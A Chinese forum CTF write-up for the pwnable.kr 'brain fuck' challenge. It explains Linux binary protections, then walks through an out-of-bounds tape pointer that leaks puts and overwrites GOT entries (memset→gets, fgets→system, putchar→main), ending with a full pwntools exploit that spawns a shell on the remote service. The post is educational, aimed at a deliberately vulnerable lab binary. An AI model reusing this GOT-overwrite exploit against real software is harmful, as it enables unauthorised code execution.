
# [原创]pwnable.kr brain fuck 滴 write up

> 引用

听说在看雪多发帖可以找到好工作,同时也支持一下pwn版块！于是乎。。。

题目简单考察的主要是我们的观察力，创造力和想象力吧（瞎编的！）

![](https://bbs.kanxue.com/upload/attach/201902/3_WT3TC539X5HP2DD.jpg)

养成好习惯，先用自带的`checksec`工具检查可执行文件属性，这里整理了一下

## 0x01、CANNARY

`CANNARY`(栈溢出保护)是一种缓冲区溢出攻击缓解手段。

启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。

## 0x02、NX

`NX`即No-eXecute（不可执行）的意思，`NX`的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。和windows下的`DEP`原理相同。

## 0x03、PIE

一般情况下`NX`和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作`PIE`。

内存地址随机化机制，有以下三种情况0 - 表示关闭进程地址空间随机化。

1 - 表示将`mmap`的基址，`stack`和`vdso`页面随机化。

2 - 表示在1的基础上增加栈（`heap`）的随机化。可以防范基于`Ret2libc`方式的针对`DEP`的攻击。`ASLR`和`DEP`配合使用，能有效阻止攻击者在堆栈上运行恶意代码。

Built as `PIE`：位置独立的可执行区域（position-independent executables）。

这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（`return-oriented programming`）方法变得难得多。

## 0x04、RELRO

在Linux系统安全领域数据可以写的存储区就会是攻击的目标,尤其是存储函数指针的区域. 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.

`GCC`, `GNU linker`以及`Glibc-dynamic linker`一起配合实现了一种叫做`relro`的技术: read only relocation.大概实现就是由`linker`指定`binary`的一块经过`dynamic linker`处理过 `relocation`之后的区域为只读.

`RELRO`设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对`GOT`（Global Offset Table）攻击。

有关`RELRO`的技术细节ce8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5j5i4u0V1k6h3&6W2k6r3I4A6L8Y4g2^5i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1j5J5x3o6p5$3i4K6u0r3x3e0q4Q4x3V1j5J5y4g2)9J5c8W2u0W2L8q4u0a6i4K6u0W2K9s2c8E0L8l9`.`.。

有关`GOT`攻击的技术原理参考31aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3M7$3#2S2L8r3!0K6L8X3q4A6L8q4)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4e0x3J5y4o6M7#2x3o6t1`.。

/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*华丽的分割线\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/

好了经过上面的复制粘贴字数显然已经够了。

进入正题。

`RELRO`是`partial`，所以`.got.plt` 可写。

![](https://bbs.kanxue.com/upload/attach/201902/3_9HWMQE2EM2JZYBU.jpg)

![](https://bbs.kanxue.com/upload/attach/201902/3_JT9U8UMXDHBGKKH.jpg)

`v7`-`v6`刚好`0x400`个空间所以没有溢出漏洞，`p`里面放着是`tape`(录音带)的地址。（`p`,`tape`都为全局变量）

输入的数据放入`v6`变量中（放入的是栈中）

下面就是循环遍历数据。并没有明显的漏洞。继续分析。

![](https://bbs.kanxue.com/upload/attach/201902/3_Q7BMSBCS967B9ZZ.jpg)

输入`'>'`,`'<'`表示`p`指针移动`'.'`打印`','`输入 。于是漏洞就很明显了

我们可以在`*p`-`0x400`和`*p`+`0x400`进行读写。

在`p`往上面翻翻看

![](https://bbs.kanxue.com/upload/attach/201902/3_Y6EZ56ARPXJUZRE.jpg)

惊奇的发现了这么一个好东西。

题目提供了`lib`库，所以需要我们自己算出`system`的偏移

思路：就是先用`putchar`泄露`puts`的地址，求出`system_addr`=`puts`的`addr`-（`puts`的`addr`-`system`的`addr`）

本来先把`putchar`给替换掉的但是中途发现传的是`byte`型的参数真是坑爹，替换`strlen`也不行每次循环都要调用。

![](https://bbs.kanxue.com/upload/attach/201902/3_SE7MST6JJPYKQF4.jpg)

换个思路，替换`memset`为`gets`，`fgets`替换为`system`，嗯可行。但是还需改变程序执行流程，

于是将`putchar`替换为`main`函数的地址。

![](https://bbs.kanxue.com/upload/attach/201902/3_TSDBDA4CU4P5ATH.jpg)

附上`exp`

```
#/usr/bin/

from pwn import *

import sys 

import time

context.arch = 'i386'

d_puts_system=0

d_gets_system=0

jump_addr='08048671'

if len(sys.argv) < 2:

	libc = ELF("./bf_libc.so")

	bf = ELF("./bf")

	p = process('./bf')   

	context.log_level = 'debug'#gdb.attach(p,'b *0x8048671')

	d_puts_system=0x254d0

	d_gets_system=0x980

else:   

	p = remote(sys.argv[1], int(sys.argv[2]))  #pwnable.kr 9001

	d_puts_system=0x24700

	d_gets_system=0x8b0

def send_fuck_data():

	log.info('start send') 

	p.recvuntil('welcome to brainfuck testing system!!\ntype some brainfuck instructions except [ ]\n')

	payload = '<'*(0x804a0a0-0x804a01b)+'.<'*(0x4)+'<'*(0x4)+',<'*(0x4)+'>'*(0x24)+',<'*(0x8)+'.'

	p.sendline(payload)

	log.info('send over') 

def modify(str_t):

	log.info('start replace') 

	payload = str_t+'/bin/sh'

	p.sendline(payload)

	log.info('replace over')

def exp():       

	send_fuck_data()

	sleep(2)

	leak_puts_addr=p.recv(4)

	hex_leak_puts_addr=leak_puts_addr.encode('hex')

	system_addr=int(hex_leak_puts_addr,16)-d_puts_system

	fgets_addr=int(hex_leak_puts_addr,16)-d_gets_system

	log.info('leak puts addr:  0x'+leak_puts_addr.encode('hex')+' system_addr: '+hex(system_addr))

	send_addr_str=hex(system_addr)[2:]

	fgets_addr_str=hex(fgets_addr)[2:]

	send_addr_str=send_addr_str+jump_addr+fgets_addr_str

	send_addr_hex = send_addr_str.decode('hex')

	modify(send_addr_hex)

	p.interactive()

if __name__ == '__main__':

	exp()
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-2-1 18:37

被admin编辑

，原因：

上传的附件：

- [bf](javascript:void(0);)

  （7.53kb，14次下载）

- [bf_libc.so](javascript:void(0);)

  （1.69MB，8次下载）

- [brain_fuck.py](javascript:void(0);)

  （1.41kb，9次下载）
